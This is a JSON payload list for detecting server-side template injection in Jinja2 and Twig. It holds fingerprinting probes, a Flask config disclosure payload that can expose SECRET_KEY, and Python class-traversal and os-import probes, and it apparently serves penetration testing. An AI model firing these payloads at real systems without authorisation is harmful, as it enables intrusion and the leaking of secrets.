{
  "_meta": {
    "version": "1.2.0",
    "policy": "PoC 전용. 실제 명령 실행 페이로드 미포함."
  },

  "generic": [
    {
      "name": "Universal Math Detection",
      "payload": "{{1337*1337}}",
      "expected": "1787569",
      "attack_type": "ssti:jinja2_twig",
      "risk_level": "LOW",
      "description": "중괄호 두 개를 사용하는 모든 엔진 기본 탐지"
    },
    {
      "name": "Jinja2 Fingerprint",
      "payload": "{{1337*'2'}}",
      "expected": "2674",
      "attack_type": "ssti:jinja2",
      "risk_level": "LOW",
      "description": "Jinja2 전용 - 1337*'2' = 2674 (정수 곱셈)"
    },
    {
      "name": "Twig Fingerprint",
      "payload": "{{1337*'2'}}",
      "expected": "13371337",
      "attack_type": "ssti:twig",
      "risk_level": "LOW",
      "description": "Twig 전용 - 1337*'2' = 13371337 (문자열 반복)"
    }
  ],

  "jinja2": [
    {
      "name": "Jinja2 Math Detection",
      "payload": "{{1337*1337}}",
      "expected": "1787569",
      "attack_type": "ssti:jinja2",
      "risk_level": "LOW",
      "description": "Python Jinja2 엔진 기본 탐지"
    },
    {
      "name": "Jinja2 Config Object Disclosure",
      "payload": "{{config}}",
      "expected": "<Config",
      "attack_type": "ssti:jinja2",
      "risk_level": "MEDIUM",
      "description": "Flask config 객체 노출 여부 확인 (SECRET_KEY 노출 가능)"
    },
    {
      "name": "Jinja2 Class MRO (Python 3)",
      "payload": "{{ ''.__class__.__mro__ }}",
      "expected": "<class 'str'>",
      "attack_type": "ssti:jinja2",
      "risk_level": "HIGH",
      "description": "Python 3 클래스 계층 접근 가능 여부 확인"
    },
    {
      "name": "Jinja2 Class MRO (Python 2)",
      "payload": "{{ ''.__class__.__mro__ }}",
      "expected": "<type 'str'>",
      "attack_type": "ssti:jinja2",
      "risk_level": "HIGH",
      "description": "Python 2 환경 대응"
    },
    {
      "name": "Jinja2 OS Detection (POSIX)",
      "payload": "{{ self.__init__.__globals__.__builtins__.__import__('os').name }}",
      "expected": "posix",
      "attack_type": "ssti:jinja2",
      "risk_level": "HIGH",
      "description": "POSIX 환경(Linux/Mac)에서 os 모듈 import 가능 여부"
    },
    {
      "name": "Jinja2 OS Detection (Windows)",
      "payload": "{{ self.__init__.__globals__.__builtins__.__import__('os').name }}",
      "expected": "nt",
      "attack_type": "ssti:jinja2",
      "risk_level": "HIGH",
      "description": "Windows 환경에서 os 모듈 import 가능 여부"
    }
  ],

